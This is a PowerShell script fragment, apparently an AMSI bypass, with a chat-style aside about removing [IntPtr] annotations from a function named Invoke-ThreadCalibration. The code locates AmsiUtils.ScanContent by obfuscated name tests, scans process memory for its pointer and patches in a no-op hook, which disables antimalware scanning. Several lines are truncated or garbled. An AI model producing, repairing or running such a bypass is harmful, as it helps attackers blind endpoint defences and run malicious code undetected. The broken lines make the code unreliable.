$asmList = [appdomain]::currentdomain.getassemblies()
$asmList | ForEach-Object {
    if($_.Location -ne $null){
        $asmName = $_.FullName.Split(",")[0]
        If($asmName.StartsWith('S') -And $asmName.EndsWith('n') -And $asmName.Length -eq 28) {
            $typeList = $_.GetTypes()
        }
    }
}

$typeList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
            $mList = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
        }
    }
}

$mList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
            $scanMethod = $_
        }
    }
}

$MethodPointer = $scanMethod.MethodHandle.Ge
$Handle = [NtHelpers]::GetCurrentProcess()
$pad = 0
$callRet = $false

And hello3 (Invoke-ThreadCalibration) has the same issue on $scanPtr, $patchAt, and $hookPtr — remove those [IntPtr]
annotations too:

function Invoke-ThreadCalibration {
    :searchLoop for($j = $startOff; $j -lt $maxOff; $j += $stepOff){
        $scanPtr = [Int64] $MethodPointer -
        $memBuf = [byte[]]::new($bufSize)
        $callRet = [NtHelpers]::ReadMem($Hanize, [ref]$pad)
        for ($i = 0; $i -lt $memBuf.Length; $i += 1) {
            $chunk = [byte[]]($memBuf[$i],$mmBuf[$i+3],$memBuf[$i+4],$memBuf[$i+5],$memBuf[$i+6],$memBuf[$i+7])
            $val = [bitconverter]::ToInt64($
            if ($val -eq $funcAddr) {
                Write-Host "OK $j $i"
                $patchAt = [Int64] $scanPtr + $i
                break searchLoop
            }
        }
    }
    $hookPtr = [NtHelpers].GetMethod('Nop').er()
    $pArr = [IntPtr[]]($hookPtr)
    [System.Runtime.InteropServices.Marshal]
    Write-Host "$(( (Get-Date) - $InitialDate).TotalSeconds)s"
}
